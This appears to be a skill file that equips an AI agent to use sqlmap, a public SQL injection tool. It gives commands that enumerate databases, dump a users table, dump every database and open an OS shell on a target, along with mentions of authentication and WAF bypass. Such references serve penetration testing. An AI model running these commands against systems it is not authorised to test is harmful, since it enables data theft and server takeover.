---
name: sqlmap
description: "sqlmap: automatic SQL injection detection and exploitation tool supporting all major database backends. Use when testing web parameters, cookies, or headers for SQLi; extracting database contents; or escalating to OS command execution via INTO OUTFILE or xp_cmdshell."
license: GPL-2.0
compatibility: "Linux / macOS / Windows. Python 3.x. Pre-installed on Kali."
metadata:
  author: AeonDave
  version: "1.0"
---

# sqlmap

Automated SQL injection detection and exploitation.

## Quick Start

```bash
sqlmap -u "http://target.com/search?id=1" --dbs
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
sqlmap -r request.txt --dbs
sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u <url>` | Target URL with parameter |
| `-r <file>` | Saved HTTP request (Burp format) |
| `--data <data>` | POST body |
| `--cookie <cookie>` | Session cookie |
| `--dbs` | Enumerate databases |
| `-D <db>` | Select database |
| `-T <table>` | Select table |
| `--dump` | Dump table data |
| `--dump-all` | Dump all databases |
| `--os-shell` | Get OS shell |
| `--level <1-5>` | Test depth (default 1) |
| `--risk <1-3>` | Risk level of tests (default 1) |
| `--batch` | Non-interactive, use defaults |
| `-p <param>` | Test specific parameter only |
| `--threads <n>` | Parallelism |
| `--proxy <proxy>` | Route through proxy |

## OS Shell

```bash
sqlmap -u "http://target.com/?id=1" --os-shell --technique=U
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Auth bypass, WAF bypass, tamper scripts |
